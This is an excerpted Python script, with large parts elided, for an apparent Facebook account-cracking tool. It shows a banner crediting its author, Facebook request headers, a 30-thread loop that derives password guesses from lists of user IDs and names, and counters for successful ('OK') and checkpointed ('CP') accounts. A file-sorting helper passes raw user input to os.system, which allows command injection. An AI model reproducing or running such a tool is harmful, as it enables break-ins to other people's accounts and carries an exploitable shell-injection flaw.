...
from concurrent.futures import ThreadPoolExecutor as REXssb
from string import * 
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :             REX
\033[1;37m Facebook:          E'ts Redwan
\033[1;37m Github  :              REXGFX
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(' REX OK: %s' % str(len(oks)))
        print(' REX CP: %s' % str(len(cps)))
        print(47*'-')
...
def REX():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100080397507515&mibextid=ZbWKwL')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100080397507515&mibextid=ZbWKwL')
    else:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with REXssb(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def cutter():
    ...
    print(" ")
    REX = input('Saving Put File Name :')
    os.system('touch ' +REX)
    os.system('sort -r '+ssb+' | uniq > '+REX)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ssb )
    print(47*'-')
    print("File Saved To :" + REX )
    print(47*'-')
